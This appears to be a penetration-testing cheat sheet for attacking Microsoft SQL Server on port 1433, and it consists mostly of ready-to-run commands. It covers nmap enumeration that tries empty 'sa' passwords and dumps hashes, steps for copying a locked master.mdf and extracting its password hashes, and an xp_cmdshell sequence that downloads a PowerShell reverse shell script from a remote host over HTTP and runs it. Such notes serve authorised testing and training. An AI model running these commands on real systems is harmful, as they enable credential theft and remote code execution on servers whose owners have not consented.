# 1433 - MSSQL

## Enumeration

```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.0.0.1
```

## Dumping Hashes From master.mdf

* May need to use [Invoke-NinjaCopy.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), as the file is locked during use.
* Extract hashes using [Invoke-MDFHashes](https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes):

```
set-executionpolicy unrestricted
add-type -path .\OrcaMDF.Framework.dll
add-type -path .\OrcaMDF.RawCore.dll
import-module .\Get-MDFHashes.ps1
Get-MDFHashes -mdf master.mdf
```

## Privilege Escalation

```
$ impacket-mssqlclient sa:password@10.0.0.1
SQL> enable_xp_cmdshell
SQL> reconfigure
SQL> xp_cmdshell whoami
SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.0.0.1/rshell.ps1") | powershell -noprofile'
```

